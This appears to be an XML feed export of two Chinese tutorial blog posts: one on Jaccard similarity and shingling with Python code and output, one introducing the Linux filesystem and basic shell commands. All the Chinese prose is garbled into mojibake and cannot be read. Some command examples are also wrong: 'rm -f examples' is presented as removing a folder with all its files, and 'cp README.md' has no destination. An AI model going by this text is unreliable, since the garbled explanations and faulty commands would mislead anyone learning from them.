Hamming distance æ˜¯é‡æ¸¬å…©å€‹ç›¸åŒé•·åº¦çš„å­—ä¸²ç›¸ç•°æ€§ï¼Œå¯ä»¥æŠŠå…©å€‹å­—ä¸²ç•¶æˆå…©å€‹å­—æ¯çš„é›†åˆï¼Œè€Œå­—æ¯å‰‡æ˜¯é›†åˆä¸­çš„å…ƒç´ ã€‚Jaccard similarity æ˜¯é‡æ¸¬å…©å€‹é›†åˆçš„ç›¸ä¼¼æ€§ï¼Œæ¯”è¼ƒå…©é›†åˆä¸­ç›¸åŒçš„å…ƒç´ ï¼Œä¸¦å°‡ç›¸ä¼¼ç¨‹åº¦é‡åŒ–æˆåœ¨ 0 åˆ° 1 çš„æ¯”ä¾‹ã€‚Edit distance æ˜¯åœ¨å°‡ç·¨è¼¯æ­·å²è€ƒæ…®åœ¨å…§çš„æƒ…æ³ä¸‹é‡æ¸¬å…©ä»»æ„å­—ä¸²ç›¸ç•°æ€§ï¼Œç°¡å–®çš„èªªï¼Œå°±æ˜¯å®šç¾© A å­—ä¸²éœ€è¦å¤šå°‘ç·¨è¼¯æ­¥é©Ÿæ‰èƒ½è®Šæˆ B å­—ä¸²ã€‚
å…ˆæœ‰äº†é›†åˆçš„æ¦‚å¿µå¾Œï¼Œå’Œå¦‚ä½•æ¯”è¼ƒé›†åˆé–“çš„ç›¸ä¼¼ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯å¦‚ä½•å®šç¾©é›†åˆå…§å…ƒç´ ã€‚å®šç¾©é›†åˆå…§çš„å…ƒç´ ä¹‹æ‰€ä»¥é‡è¦ï¼Œæ˜¯å› ç‚ºå…ƒç´ çš„å®šç¾©æœƒå½±éŸ¿æ¯”è¼ƒçš„æ–¹æ³•ï¼Œè¦æ¨¡ï¼Œæœ€çµ‚æœƒå½±éŸ¿é›†åˆæ¯”å°çš„çµæœã€‚åœ¨æ–‡å­—æ¢å‹˜çš„é ˜åŸŸä¸­ï¼ŒShingling å°±æ˜¯ä¸€å€‹å¸¸ç”¨çš„æŠ€è¡“ [è¨» 2]ã€‚Shingle åŸæœ¬æ„æ€æ˜¯éµåµçŸ³ï¼Œé€šå¸¸ä¹Ÿå¯ä»¥ç•¶ä½œå»ºç¯‰çš„ææ–™ï¼Œåœ¨é€™è£¡å¯ä»¥çœ‹ä½œæ˜¯å»ºç«‹é›†åˆçš„åŸºçŸ³ã€‚Shingle å¯ä»¥æ˜¯ä¸€å€‹å­—å½™ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€å€‹å­—æ¯ï¼Œå¯ä»¥æ˜¯ K å€‹é‡ç–Šä¸”ç›¸é€£ï¼ˆoverlapping and consecutiveï¼‰çš„å­—æ¯ï¼Œæˆ– K å€‹é‡ç–Šä¸”ç›¸é€£çš„å­—å½™ï¼Œç«¯çœ‹æ‡‰ç”¨ç‚ºä½•ï¼Ÿåœ¨ç¶²é æœå°‹çš„æ‡‰ç”¨ä¸­ï¼Œå¤šåŠæ˜¯åœ¨å­—å…ƒçš„å±¤ç´šä¸Šä¾†åšåˆ†æï¼Œæ‰€ä»¥åœ¨éŒ¯åˆ¥å­—æˆ–æ˜¯åŒç¾©å­—æ›¿æ›çš„å®¹å¿åº¦ä¸Šï¼Œæ²’æœ‰é€™éº¼é«˜ï¼Œä¹Ÿå°±ç„¡æ³•ä½œç‚ºèªæ„ç†è§£çš„å­¸ç¿’æ¨¡å‹ï¼Œä½†åœ¨ä½å±¤ç´šçš„æ¯”è¼ƒä¸Šï¼Œå¦‚æ–‡ä»¶åˆ†æï¼ˆTextual Analysisï¼‰å»å·²è¶³å¤ ã€‚é€šå¸¸ä»¥å–®ä¸€ Shingle ä½œç‚ºé›†åˆä¸­çš„å…ƒç´ ï¼Œæœƒé€ æˆé›†åˆé–“çš„ä½è®Šç•°ï¼Œå› ç‚ºè¼ƒå°‘çš„å¯ç”¨å…ƒç´ çµ„åˆã€‚è©¦æƒ³ï¼Œä»¥è‹±æ–‡å­—æ¯ä½œç‚º Shingle ä¾†æ¯”è¼ƒæ–‡ä»¶ï¼Œè‹¥ä¸è€ƒæ…®æ¨™é»ç¬¦è™Ÿï¼Œç¸½å…±åªæœ‰ 26 å€‹é¸æ“‡ï¼Œä»¥åŠè‹¥ä»¥ K å€‹å­—æ¯ä½œç‚º K-Shingleï¼Œå‰‡æœ‰ $26^K$ å€‹é¸æ“‡ï¼Œé¡¯ç„¶åœ°ï¼Œå¾Œè€…å¯ä»¥çµ„åˆçš„é›†åˆæ•¸ç›®è¦å¤§çš„å¤šäº†ï¼
æˆ‘å€‘ç¾åœ¨ç¨å¾®æ”¹è®Šä¸€ä¸‹æ›¸ä¸­ç¾æˆçš„ä¾‹å­[Example 3.4]ï¼Œä¾†èªªæ˜å®šç¾© Shingle å°æ–¼æ¯”è¼ƒé›†åˆç›¸ä¼¼åº¦çš„å½±éŸ¿ï¼šå¥å­ä¸€ï¼š â€œthe plane was ready for touch downâ€å¥å­äºŒï¼š â€œthe quarterback was ready for scoring a touchdownâ€çš†ä¸è€ƒæ…®å¤§å°å¯«ï¼Œè¨ˆç®— Jaccard Similarity çš„çµæœå¦‚ä¸‹ï¼š



Definition of Shingles
Jaccard Similarity



ä»¥å–®ä¸€å­—æ¯ç‚º 1-Shingleï¼Œä¸è€ƒæ…®ç©ºç™½
0.67


ä»¥ 9 å€‹å­—æ¯ç‚º 9-Shinglesï¼Œè€ƒæ…®ç©ºç™½
0.12


ä»¥ 9 å€‹å­—æ¯ç‚º 9-Shinglesï¼Œä¸è€ƒæ…®ç©ºç™½
0.08


ä»¥ 3 å€‹å­—å½™ç‚º 3-Shingle wordsï¼Œä¸è€ƒæ…® stop words
0.10


ä»¥ 3 å€‹å­—å½™ç‚º 3-Shingle wordsï¼Œè€ƒæ…® stop words [è¨» 3]
0.20


def shingle(k, doc, remove_whitespaces = False):    &quot;&quot;&quot; calculate shingle given k by characters    &gt;&gt;&gt; sorted(shingle(2, [&quot;abcdabd&quot;]))    [&#x27;ab&#x27;, &#x27;bc&#x27;, &#x27;bd&#x27;, &#x27;cd&#x27;, &#x27;da&#x27;]    &gt;&gt;&gt; shingle(9, [&quot;The plane was ready for touch down&quot;]) &amp; shingle(    ... 9, [&quot;The quarterback scored a touchdown&quot;])    set()    &gt;&gt;&gt; shingle(9, [&quot;The plane was ready for touch down&quot;], True) &amp; shingle(    ... 9, [&quot;The quarterback scored a touchdown&quot;], True)    &#123;&#x27;touchdown&#x27;&#125;    &quot;&quot;&quot;    shingles = set()    for line in doc:        if remove_whitespaces:            line = line.replace(&quot; &quot;,&quot;&quot;)        for i in range(0, len(line) - k + 1):            shingles.add(line[i:i+k])    return(shingles)def word_shingle(k, doc, use_stopword=True):    &quot;&quot;&quot; calculate shingle given k by words    &gt;&gt;&gt; set([&quot;A spokesperson for&quot;, &quot;for the Sudzo&quot;, &quot;the Sudzo Corporation&quot;, &quot;that studies have&quot;,    ... &quot;have shown it&quot;, &quot;it is good&quot;, &quot;is good for&quot;, &quot;for people to&quot;, &quot;to buy Sudzo&quot;]) == word_shingle(3,    ... [&quot;A spokesperson for the Sudzo Corporation revealed today &quot;    ... &quot;that studies have shown it is good for people to buy Sudzo products.&quot;])    True    &gt;&gt;&gt; set([&quot;A spokesperson for&quot;, &quot;spokesperson for the&quot;, &quot;for the Sudzo&quot;,     ... &quot;the Sudzo Corporation&quot;]) == word_shingle(3,    ... [&quot;A spokesperson for the Sudzo Corporation&quot;], False)    True    &quot;&quot;&quot;    from nltk.corpus import stopwords    from nltk.tokenize import word_tokenize    shingles = set()    for line in doc:        tokens = word_tokenize(line)        for i in range(0, len(tokens) - k + 1):            if use_stopword == True and tokens[i].lower() in stopwords.words(&#x27;english&#x27;):                shingles.add(&#x27; &#x27;.join(tokens[i:i+k]))            if not use_stopword:                shingles.add(&#x27; &#x27;.join(tokens[i:i+k]))            i = i + 1    return(shingles)def print_out(k, str1, str2, call_back, **kwargs):    print(&quot;========&quot;)    results = [call_back(k, [s], **kwargs) for s in [str1, str2]]    print(&quot;the &#123;&#125;-shingle set from str1 is (&#123;&#125;)&quot;.format(k, &#x27;,&#x27;.join(results[0])))    print(&quot;the &#123;&#125;-shingle set from str2 is (&#123;&#125;)&quot;.format(k, &#x27;,&#x27;.join(results[1])))    print(&quot;the Jaccard similarity between two is &#123;:.2f&#125;&quot;.format(        jaccard_similarity(*results)))str1, str2 = &quot;the plane was ready for touch down&quot;, &quot;the quarterback was ready for scoring a touchdown&quot;print_out(1, str1, str2, shingle, remove_whitespaces=True)# comment 9-shingle output for clean output# print_out(9, str1, str2, shingle)# print_out(9, str1, str2, shingle, remove_whitespaces=True)print_out(3, str1, str2, word_shingle, use_stopword=False)print_out(3, str1, str2, word_shingle)

========
the 1-shingle set from str1 is (r,u,h,o,c,d,y,t,a,p,n,l,e,f,w,s)
the 1-shingle set from str2 is (u,r,h,c,o,d,q,y,t,a,k,n,e,i,f,b,w,g,s)
the Jaccard similarity between two is 0.67
========
the 3-shingle set from str1 is (the plane was,for touch down,ready for touch,plane was ready,was ready for)
the 3-shingle set from str2 is (was ready for,scoring a touchdown,ready for scoring,the quarterback was,for scoring a,quarterback was ready)
the Jaccard similarity between two is 0.10
========
the 3-shingle set from str1 is (the plane was,for touch down,was ready for)
the 3-shingle set from str2 is (for scoring a,the quarterback was,was ready for)
the Jaccard similarity between two is 0.20

ä¸éï¼Œå®šç¾©äº† Shingle åªæ˜¯å‘è¼ƒç‚ºå®Œå‚™çš„èªè¨€åˆ†æè·¨é€²äº†ä¸€å°æ­¥ï¼Œé¢å°å»£è¢¤çš„æ–‡ä»¶å¤§æµ·ï¼Œå…©å…©æ¯”å°æ–‡ä»¶çš„ç›¸ä¼¼åº¦ï¼Œä»æœƒé€ æˆå¦‚å¤©æ–‡æ•¸å­—èˆ¬å¯æ€•çš„è¨ˆç®—æ•¸ç›®ï¼Œæ‰€ä»¥åœ¨å¯¦å‹™å·¨é‡è³‡æ–™çš„æ‡‰ç”¨ä¸Šï¼Œæˆ‘å€‘ä»ç„¶éœ€è¦éå¸¸å¿«é€Ÿçš„æ–¹æ³•ä¾†å¯¦ç¾ï¼Œé€™äº›æŠ€å·§å°‡æœƒåœ¨ä¸‹é¢å¹¾ç¯‡æåˆ°ã€‚
æœ€å¾Œï¼Œå¸Œæœ›æœ¬æ–‡èƒ½å¼•èµ·è¨±å¤šå¥³å­©å°æ–¼æ¼”ç®—æ³•çš„èˆˆè¶£ï¼ŒåŒæ™‚å°å¹³æ—¥ç›¸ç•¶æ•£æ¼«çš„æˆ‘ï¼Œèƒ½æœ‰æ•ˆé‡æ¸…ä¸€äº›å›°æƒ‘ã€‚è‹¥æœ¬æ–‡æœ‰ä»»ä½•ä¸ç›¡å®Œå–„çš„åœ°æ–¹ï¼Œæ•¬è«‹æ‰¹è©•æŒ‡æ•™å›‰ï¼
è¨» 1: å…©é›†åˆå¯ä»¥æ“æœ‰ç›¸ç•¶é«˜çš„ Jaccard Similarityï¼Œä½†ä¸ä¸€å®šå…·æœ‰çµ±è¨ˆä¸Šçš„ç›¸ä¼¼æ„ç¾©ï¼ˆstatistical significanceï¼‰ã€‚è©¦æƒ³ï¼Œè‹¥å› ç‚ºå–æ¨£èª¤å·®ï¼Œå…©é›†åˆéƒ½åªåŒ…æ‹¬ä¸€å€‹å…ƒç´ ï¼Œé‚£éº¼ Jaccard Similiaryt ä¸æ˜¯ 1 å°±æ˜¯ 0ï¼Œé€™æ¨£è¨ˆç®—å‡ºä¾†çš„çµæœï¼Œèª¤å°æ€§å°±ç›¸ç•¶é«˜äº†ï¼è¨» 2: Shingle å’Œæ–‡å­—æ¢å‹˜é ˜åŸŸä¸­ç¶“å¸¸ä½¿ç”¨çš„ n-gramï¼Œåœ¨ wiki ä¸Šçš„å€åˆ¥æœ‰é»è®“äººæ„Ÿåˆ°å›°æƒ‘ã€‚Shingle æ­¤è©æœ€æ—©æ˜¯å‡ºç¾åœ¨ Border et al. 1997 å¹´çš„æ–‡ç« ï¼Œä¸¦æ²’æœ‰ç‰¹åˆ¥æŒ‡å‡º Shingle å¿…é ˆæ˜¯å­—è©ç‚ºå–®ä½ï¼Œç›¸åçš„åªæ˜¯å®šç¾© Shinge ç‚ºç›¸é€£çš„å­å­—ä¸²ã€‚ï¼ˆa contiguous subsequenceï¼‰ã€‚äº‹å¯¦ä¸Šï¼Œæˆ‘æ‡·ç–‘åªæ˜¯å…©å€‹å¯äº’ç›¸äº¤æ›è€Œä¸æ”¹è®Šæ„ç¾©çš„å°ˆæœ‰åè©ï¼Œåªæ˜¯ n-gram çš„æ‡‰ç”¨é ˜åŸŸè¼ƒå»£ï¼Œè¼ƒç‚ºäººçŸ¥ç½·äº†ï¼è¨» 3: stop words æŒ‡çš„æ˜¯èªè¨€æ¨¡å‹ä¸­ç¶“å¸¸ä½¿ç”¨ï¼Œä½†åœ¨æ–‡ä»¶æ¯”è¼ƒä¸­ä¸å…·æœ‰è­˜åˆ¥æ€§çš„æ•ˆæœã€‚å¦‚å®šå† è© the å’Œä¸å®šå† è© aã€‚
Reference:[1] Ch 3 Finding Similar Measure in Mining Massive Datasets by Jure Leskovec, Anand Rajaraman, Jeffrey D. UllmanCoursera Mining Massive Datasets course (Ch 3-1, 3-2 and some sections from 3-5)
é—œæ–¼ä½œè€…ï¼š@renewang äººå·¥æ™ºæ…§ç†±æ„›è€…ï¼Œå¤¢æƒ³èƒ½ç”¨å¤§æ•¸æ“šä¾†ä¿ƒé€²ä¸–ç•Œå’Œå¹³
]]></content>
      <tags>
        <tag>æ¼”ç®—æ³•</tag>
        <tag>å¤§æ•¸æ“š</tag>
        <tag>mining massive dataset</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Command å‘½ä»¤åˆ—æŒ‡ä»¤èˆ‡åŸºæœ¬æ“ä½œå…¥é–€æ•™å­¸</title>
    <url>/2017/12/23/linux-commnd-line-tutorial/</url>
    <content><![CDATA[
å‰è¨€è¦æˆç‚ºä¸€å€‹çœŸæ­£çš„è»Ÿé«”å·¥ç¨‹å¸«ï¼ˆSoftware Engineerï¼‰ä¸ä¸€å®šä¸€å®šè¦ä½¿ç”¨ vim ä¹‹é¡çš„ç·¨è¼¯å™¨é€²è¡Œé–‹ç™¼ï¼Œä½†ç†Ÿæ‚‰ä½¿ç”¨çµ‚ç«¯æ©Ÿï¼ˆterminalï¼‰æ“ä½œå’Œå¸¸ç”¨çš„ Linux å‘½ä»¤åˆ—æŒ‡ä»¤ç¢¼æ“ä½œå‰‡æ˜¯å¿…é ˆçš„ã€‚å› æ­¤æ¥è‘—æˆ‘å€‘å°‡ä»‹ç´¹è»Ÿé«”å·¥ç¨‹å¸«åœ¨é–‹ç™¼ä¸Šå¸¸ç”¨çš„ Linux å‘½ä»¤åˆ—æŒ‡ä»¤ç¢¼çµ¦è®€è€…åƒè€ƒã€‚è‹¥è®€è€…ä½¿ç”¨çš„æ˜¯ Windows å»ºè­°å®‰è£ VirtualBox ä¸¦åœ¨ä¸Šé¢è·‘ Linux&#x2F;Ubuntu ä¾†é€²è¡ŒæŒ‡ä»¤ç¢¼æ“ä½œï¼Œæˆ–æ˜¯ä½¿ç”¨åƒæ˜¯ Cmder çš„å·¥å…·ä¾†é€²è¡Œæ“ä½œã€‚é—œæ–¼ç›¸é—œå·¥å…·å®‰è£å¯ä»¥åƒè€ƒ å¦‚ä½•åœ¨ Windows æ‰“é€  Python é–‹ç™¼ç’°å¢ƒè¨­å®šåŸºç¤å…¥é–€æ•™å­¸ é€™ç¯‡æ•™å­¸æ–‡ç« ã€‚å¥½ï¼Œé‚£æˆ‘å€‘å°±æº–å‚™é–‹å§‹å§ï¼

ä»€éº¼æ˜¯ Linuxï¼ŸLinux æ˜¯ä¸€ç¨®è‡ªç”±é–‹æ”¾åŸå§‹ç¢¼çš„é¡ Unix çš„ä½œæ¥­ç³»çµ±ï¼Œå…¶å»£æ³›é‹ç”¨æ–¼ä¼ºæœå™¨å’ŒåµŒå…¥å¼ç³»çµ±ä¸­ã€‚ç›®å‰ä¸»æµçš„ Linux ç™¼ä½ˆç‰ˆæœ¬ï¼ˆLinux distributionsï¼Œä¿‚æŒ‡å¯å®Œæ•´å®‰è£ä½¿ç”¨çš„å¥—ä»¶ç‰ˆæœ¬ï¼‰åŒ…æ‹¬ï¼šDebianã€Fedoraã€CentOSã€Ubuntu ç­‰ã€‚ä»¥ä¸‹æˆ‘å€‘ä¸»è¦å°‡æœƒèšç„¦åœ¨ Linux&#x2F;Ubuntu å¸¸ç”¨æŒ‡ä»¤å’ŒåŸºç¤æ“ä½œçš„å…¥é–€æ•™å­¸ä»‹ç´¹ä¸Šï¼ˆæ¯å€‹æŒ‡ä»¤å‰ä½¿ç”¨ $ ç•¶ä½œæç¤ºå­—å…ƒï¼Œä¸ç”¨è¼¸å…¥ï¼‰ã€‚

Linux æª”æ¡ˆç³»çµ±æ¶æ§‹ç†è«–ä¸Šæ‰€æœ‰çš„ Linux ç™¼ä½ˆç‰ˆæœ¬æ‡‰è©²éƒ½è¦éµå®ˆæª”æ¡ˆç³»çµ±çš„æ¨™æº–ï¼ˆFilesystem Hierarchy Standard, FHSï¼‰ï¼Œä½†æ ¹æ“šç™¼ä½ˆç‰ˆæœ¬ä¸åŒæˆ–æœ‰å·®ç•°ï¼Œä¸éå¤§è‡´ä¸Šæª”æ¡ˆç³»çµ±æ¶æ§‹å¦‚ä¸‹ï¼š

&#x2F;bin, &#x2F;sbin/bin ä¸»è¦æ”¾ç½®ä¸€èˆ¬ä½¿ç”¨è€…å¯ä»¥æ“ä½œçš„æŒ‡ä»¤ï¼Œ/sbin æ”¾ç½®ç³»çµ±ç®¡ç†å“¡å¯ä»¥æ“ä½œçš„æŒ‡ä»¤ã€‚é€£çµåˆ° /usr/binï¼Œ/usr/sbin 

&#x2F;bootä¸»è¦æ”¾ç½®é–‹æ©Ÿç›¸é—œæª”æ¡ˆ  

&#x2F;devæ”¾ç½® device è£ç½®æª”æ¡ˆï¼ŒåŒ…è©±æ»‘é¼ éµç›¤ç­‰

&#x2F;etcä¸»è¦æ”¾ç½®ç³»çµ±æª”æ¡ˆ

&#x2F;home, &#x2F;root/home ä¸»è¦æ˜¯ä¸€èˆ¬å¸³æˆ¶çš„å®¶ç›®éŒ„ï¼Œ/root ç‚ºç³»çµ±ç®¡ç†è€…çš„å®¶ç›®éŒ„

&#x2F;lib, &#x2F;lib64ä¸»è¦ç‚ºç³»çµ±å‡½å¼åº«å’Œæ ¸å¿ƒå‡½å¼åº«ï¼Œè‹¥æ˜¯ 64 ä½å…ƒå‰‡æ”¾åœ¨ /lib64ã€‚é€£çµåˆ° /usr/lib, /usr/lib64

&#x2F;procå°‡è¨˜æ†¶é«”å…§çš„è³‡æ–™åšæˆæª”æ¡ˆé¡å‹

&#x2F;sysèˆ‡ /proc é¡ä¼¼ï¼Œä½†ä¸»è¦é‡å°ç¡¬é«”ç›¸é—œåƒæ•¸

&#x2F;usr/usr å…¨åç‚º unix software resource ç¸®å¯«ï¼Œæ”¾ç½®ç³»çµ±ç›¸é—œè»Ÿé«”ã€æœå‹™ï¼ˆæ³¨æ„ä¸æ˜¯ user çš„ç¸®å¯«å–”ï¼ï¼‰

&#x2F;varå…¨åç‚º variableï¼Œæ”¾ç½®ä¸€äº›è®Šæ•¸æˆ–è¨˜éŒ„æª”

&#x2F;tmpå…¨åç‚º temporaryï¼Œæ”¾ç½®æš«å­˜æª”æ¡ˆ

&#x2F;media, &#x2F;mntæ”¾ç½®éš¨æ’å³ç”¨çš„è£ç½®æ…£ç”¨ç›®éŒ„ï¼Œ /mnt ç‚ºç®¡ç†å“¡&#x2F;ä½¿ç”¨è€…æ‰‹å‹•æ›ä¸Šï¼ˆmountï¼‰çš„ç›®éŒ„

&#x2F;optå…¨åç‚º optionalï¼Œé€šå¸¸ç‚ºç¬¬ä¸‰æ–¹å» å•†æ”¾ç½®è»Ÿé«”è™•

&#x2F;runç³»çµ±é€²è¡Œæœå‹™è»Ÿé«”é‹ä½œç®¡ç†è™•

&#x2F;srvé€šå¸¸æ˜¯æ”¾ç½®é–‹ç™¼çš„æœå‹™ï¼ˆserviceï¼‰ï¼Œå¦‚ï¼šç¶²ç«™æœå‹™ www ç­‰


æª”æ¡ˆèˆ‡ç›®éŒ„ç®¡ç†æŒ‡ä»¤åœ¨ Ubuntu ä¸­æˆ‘å€‘å¯ä»¥æ‰“é–‹çµ‚ç«¯æ©Ÿé€²è¡ŒæŒ‡ä»¤æ“ä½œï¼Œå°±å¯ä»¥é€éæŒ‡ä»¤ä¾†ç®¡ç†æª”æ¡ˆã€‚
ä¸€èˆ¬æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š
$ æŒ‡ä»¤ [é¸é …] [é¸é …å€¼]



lsï¼šlistï¼ŒæŸ¥çœ‹æª”æ¡ˆåŠå­ç›®éŒ„
 åˆ—å‡ºåŸºæœ¬è³‡æ–™å¤¾è³‡æ–™ï¼š
 ls

 åˆ—å‡ºè©³ç´°è³‡æ–™å’Œéš±è—è³‡æ–™ï¼š
 // -l åˆ—å‡ºè©³ç´°è³‡æ–™ -a åˆ—å‡ºéš±è—è³‡æ–™$ ls -la

 åˆ—å‡ºéƒ¨åˆ†æª”æ¡ˆï¼š
 // åˆ—å‡ºç‚º .js çš„æª”æ¡ˆ$ ls *.js

pwdï¼šprint work directoryï¼Œå°å‡ºç›®å‰å·¥ä½œç›®éŒ„
 $ pwd// /Users/happycoder/Desktop/projects/HappyCoder

cdï¼šchange directoryï¼Œç§»å‹•é€²å…¥è³‡æ–™å¤¾
 ç§»å‹•åˆ°ç›®å‰è³‡æ–™å¤¾ä¸‹çš„ examples è³‡æ–™å¤¾ï¼š
 $ cd ./examples

 ç§»å‹•åˆ°å®¶ç›®éŒ„ï¼š~ï¼š
 $ cd ~

 ç§»å‹•åˆ°ä¸Šä¸€å±¤ç›®éŒ„ ..ï¼š
 $ cd ..

 ç§»å‹•åˆ°æ ¹ç›®éŒ„ /ï¼š
 $ cd /

mkdirï¼šmake directoryï¼Œå‰µå»ºæ–°è³‡æ–™å¤¾
 $ mkdir examples

cpï¼šcopyï¼Œè¤‡è£½æª”æ¡ˆ
 å…ˆå°‡å­—ä¸² TEST å­˜å…¥ README.md æ–‡ä»¶ä¸­
 $ echo &quot;TEST&quot; &gt; README.md

 $ cp README.md

mvï¼šmove (rename) filesï¼Œç§»å‹•æª”æ¡ˆæˆ–æ˜¯é‡æ–°å‘½åæª”æ¡ˆ
 ç§»å‹•æª”æ¡ˆï¼š
 $ mv README.md /examples/README.md

 é‡æ–°å‘½å
 $ mv README.md README_MV.md

rmï¼šremove fileï¼Œåˆªé™¤æª”æ¡ˆ
 $ rm README.md

 åˆªé™¤ç›®å‰è³‡æ–™å¤¾ä¸‹å‰¯æª”åç‚º .js æª”æ¡ˆï¼š
 $ rm *.js

 åˆªé™¤è³‡æ–™å¤¾å’Œæ‰€æœ‰æª”æ¡ˆï¼š
 $ rm -f examples

touchï¼šç”¨ä¾†æ›´æ–°å·²å­˜åœ¨æ–‡ä»¶çš„ timestamp æ™‚é–“æˆ³è¨˜æˆ–æ˜¯æ–°å¢ç©ºç™½æª”æ¡ˆ
 $ touch README.md

catï¼šå°‡æ–‡ä»¶å°å‡ºåœ¨çµ‚ç«¯æ©Ÿä¸Š
 $ cat README.md

tailï¼šé¡¯ç¤ºæª”æ¡ˆæœ€å¾Œå¹¾è¡Œå…§å®¹
$ tail README.md

æŒçºŒé¡¯ç¤ºæ›´æ–°å…§å®¹ï¼Œå¸¸ç”¨æ–¼ web server çœ‹ log debug ä½¿ç”¨ï¼š
$ tail -f README.md

moreï¼šå°‡æª”æ¡ˆä¸€é é å°åœ¨çµ‚ç«¯æ©Ÿä¸Š
å¯ä»¥ä½¿ç”¨ä¸Šä¸‹ç§»å‹•æ›é ï¼ŒæŒ‰ q é›¢é–‹ï¼š
$ more README.md

fileï¼šæª¢æŸ¥æª”æ¡ˆé¡å‹
$ file README.md// README.md: HTML document text, UTF-8 Unicode text

ç·¨è¼¯æ–‡å­—æª”æ¡ˆ
nanoï¼šåœ¨çµ‚ç«¯æ©Ÿç·¨è¼¯æ–‡å­—æª”æ¡ˆ
 ç·¨è¼¯æˆ–æ˜¯æ–°å¢æ–‡å­—æª”æ¡ˆï¼š
 $ nano README.md

 å•Ÿå‹•ç·¨è¼¯å®Œå¾Œå¯ä»¥ä½¿ç”¨ Ctrl + X é›¢é–‹ï¼ŒCtrl + V ç§»å‹•åˆ°ä¸Šä¸€é ï¼ŒCtrl + Y ç§»å‹•åˆ°ä¸‹ä¸€é ï¼ŒCtrl + W æœå°‹æ–‡å­—å…§å®¹ 

vimï¼šåœ¨çµ‚ç«¯æ©Ÿç·¨è¼¯æ–‡å­—æª”æ¡ˆ
 $ vim README.md

 å•Ÿå‹•å¾Œï¼Œä½¿ç”¨ i é€²å…¥ç·¨è¼¯ï¼Œesc é›¢é–‹ç·¨è¼¯æ¨¡å¼ï¼Œ:q ä¸å„²å­˜é›¢é–‹ï¼Œ:wq å„²å­˜é›¢é–‹ï¼Œ:q! å¼·åˆ¶é›¢é–‹


æª”æ¡ˆæ¬Šé™è¨­å®šåœ¨ Linux ç³»çµ±ä¸­ï¼Œæ¯ä¸€å€‹ Linux æª”æ¡ˆéƒ½å…·æœ‰å››ç¨®å­˜å–æ¬Šé™ï¼š

å¯è®€å–ï¼ˆrï¼ŒReadableï¼‰ï¼Œç”¨æ•¸å­— 4 è¡¨ç¤º
å¯å¯«å…¥ï¼ˆwï¼Œwritableï¼‰ï¼Œç”¨æ•¸å­— 2 è¡¨ç¤º
å¯åŸ·è¡Œï¼šï¼ˆxï¼ŒeXecuteï¼‰ï¼Œç”¨æ•¸å­— 1 è¡¨ç¤º
ç„¡æ¬Šé™ï¼ˆ-ï¼‰ï¼Œç”¨æ•¸å­— 0 è¡¨ç¤º

ç³»çµ±ç®¡ç†è€…ä¾æ“šä½¿ç”¨è€…éœ€æ±‚ä¾†è¨­å®šæª”æ¡ˆæ¬Šé™ï¼Œè‹¥æˆ‘å€‘æƒ³æª¢è¦–æª”æ¡ˆæ¬Šé™å¯ä»¥ä½¿ç”¨ $ ls -l ä¾†æŸ¥çœ‹


ç¬¬ä¸€æ¬„ï¼šä½¿ç”¨è€…æ¬Šé™ ç”± 10 å€‹å­—å…ƒçµ„æˆï¼Œç¬¬ä¸€å€‹å­—å…ƒè¡¨ç¤ºæª”æ¡ˆå‹æ…‹ï¼ˆ- ç‚ºæª”æ¡ˆï¼Œd è¡¨ç¤ºç›®éŒ„ï¼Œ1 è¡¨ç¤ºé€£çµæª”æ¡ˆï¼‰ã€‚å­—å…ƒ 2ã€3ã€4 è¡¨ç¤ºæª”æ¡ˆæ“æœ‰è€…çš„å­˜å–æ¬Šé™ã€‚å­—å…ƒ 5ã€6ã€7 è¡¨ç¤ºæª”æ¡ˆæ“æœ‰è€…æ‰€å±¬ç¾¤çµ„æˆå“¡çš„å­˜å–æ¬Šé™ã€‚å­—å…ƒ 8ã€9ã€10 è¡¨ç¤ºå…¶ä»–ä½¿ç”¨è€…çš„å­˜å–æ¬Šé™
 èˆ‰ä¾‹ä¾†èªª -rwxrwxrâ€“ï¼Œä»£è¡¨é€™æ˜¯ä¸€æ ¼æª”æ¡ˆï¼Œæ“æœ‰è€…å’Œç¾¤çµ„éƒ½å…·å‚™è®€å–ã€å¯«å…¥å’ŒåŸ·è¡Œæ¬Šé™ï¼Œå…¶ä»–ä½¿ç”¨è€…åªæ“æœ‰è®€å–æ¬Šé™

ç¬¬äºŒæ¬„ï¼šæª”æ¡ˆæ•¸é‡

ç¬¬ä¸‰æ¬„ï¼šæ“æœ‰è€…

ç¬¬å››æ¬„ï¼šç¾¤çµ„

ç¬¬äº”æ¬„ï¼šæª”æ¡ˆå¤§å°

ç¬¬å…­æ¬„ï¼šæª”æ¡ˆå»ºç«‹æ™‚é–“

ç¬¬ä¸ƒæ¬„ï¼šæª”æ¡ˆåç¨±


æ¥ä¸‹ä¾†ä»‹ç´¹å¦‚ä½•é€éæŒ‡ä»¤ä¿®æ”¹æ¬Šé™ï¼š

chmodï¼šä¿®æ”¹æª”æ¡ˆæ¬Šé™
 å°‡æ¬Šé™è¨­ç‚º rw-rw-r--ï¼š
 $ chmod 664 README.md

 å°‡æª”æ¡ˆçš„ä½¿ç”¨è€…å’Œç¾¤çµ„åŠ å…¥åŸ·è¡Œæ¬Šé™
 $ chmod ug+x README.md

chownï¼šä¿®æ”¹æª”æ¡ˆæ“æœ‰è€…èˆ‡ç¾¤çµ„
 $ chown www-data:www-data README.md

ç³»çµ±ç®¡ç†
sudoï¼šä½¿ç”¨æœ€é«˜æ¬Šé™ï¼ˆsuperuserï¼‰åŸ·è¡ŒæŒ‡ä»¤ï¼Œæœƒè¦æ±‚è¼¸å…¥è‡ªå·±å¯†ç¢¼ï¼Œä½¿ç”¨ä¸Šå¿…é ˆéå¸¸å°å¿ƒ
 $ sudo git clone xxx.py

suï¼šsu æŒ‡ä»¤å¯ä»¥è®“ä¸€èˆ¬çš„ Linux ä½¿ç”¨è€…è¼¸å…¥ root å¯†ç¢¼å–å¾— root æ¬Šé™ï¼Œæš«æ™‚å–å¾— root æ¬Šé™çš„ä½¿ç”¨è€…å°±å¦‚åŒ root ä¸€æ¨£å¯ä»¥å°ç³»çµ±é€²è¡Œå„ç¨®è®Šæ›´å‹•ä½œ
 $ su

killï¼šæ ¹æ“š Process ID æŒ‡å®šè¦çµ‚æ­¢ç¨‹å¼
 $ kill PID

 ç«‹å³å¼·åˆ¶åŸ·è¡Œï¼š
 $ kill -9 PID

